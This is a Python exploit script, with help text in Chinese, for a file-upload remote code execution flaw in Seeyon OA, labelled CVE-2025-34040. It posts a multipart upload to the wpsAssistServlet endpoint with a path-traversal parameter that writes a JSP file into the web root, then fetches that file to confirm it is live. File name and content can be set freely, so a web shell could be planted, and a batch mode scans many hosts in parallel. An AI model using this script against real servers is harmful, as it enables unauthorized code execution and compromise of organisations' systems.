import argparse
import re
import textwrap
from multiprocessing.dummy import Pool
import requests
import warnings
import urllib3
from urllib3.exceptions import InsecureRequestWarning





def main():
    # 关闭警告
    urllib3.disable_warnings(InsecureRequestWarning)
    warnings.filterwarnings("ignore")

    banner = r"""
             __   .__             .__ 
            |__|  |__|    ______  |__|
            |  |  |  |   /  ___/  |  |
            |  |  |  |   \___ \   |  |
        /\__|  |  |__|  /____  >  |__|
        \______|             \/       

            """
    print(banner)

    parser = argparse.ArgumentParser(description='致远OA存在文件上传导致RCE（CVE-2025-34040）',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent("实例：python3 1.py -u http://www.baidu.com"))
    parser.add_argument("-u", "--url", dest="url", help="请输入待检测的URL")
    parser.add_argument("-f", "--file", dest="file", help="请输入一行一个URL的文件地址")
    parser.add_argument("-n", "--filename", dest="filename", help="请输入文件名（默认为Hello.jsp）：")
    parser.add_argument("-c", "--content", dest="content", help="请输入上传的文件内容（默认为HelloWord）：",)

    args = parser.parse_args()


    urls = []  # 空列表，接收文件中的url

    if args.url:
        check(update(args.url),args.filename,args.content)
    elif args.file:              #批量检测入口
        try:
            with open(args.file, 'r+') as f:
                for i in f:
                    i = i.strip()
                    urls.append(update(i))
            pool = Pool(30)
            pool.map(check, urls)
        except Exception as e:
            print(e)
    else:
        print('请输入参数')


#处理没有协议头的url
def update(domain):
    if 'http' in domain:
        return domain
    else:
        return f'http://{domain}'

#用于检测漏洞
def check(domain,filename=None,content=None):


    if filename == None:
        filename = "Hello.jsp"
    if content == None:
        content = '<% out.println("HelloWorld");%>'

    # 构建 multipart/form-data
    files = {
        'upload': ('123.xls', content, 'application/vnd.ms-excel')
    }

    url = f'{domain}/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{filename}&fileId=2'
    url1 = f'{domain}/{filename}'
    try:
        response = requests.post(url, files=files,verify=False, timeout=5)
        response1 = requests.get(url1,verify=False,timeout=5)

        if 'code":200' in response.text and 'success":true' in response.text and response.status_code == 200:
            if response1.status_code == 200:
                print(f'[+] {domain} 文件上传成功,路径：{url1}')
            else:
                print(f'[+] 文件上传失败，响应码为：{response1.status_code},请手动验证：{url1}')
        else:
            print(f'[-] {domain} 不存在漏洞')
    except Exception as e:
        print(f'[!] {domain} 检测出现错误')




if __name__ == '__main__':
    main()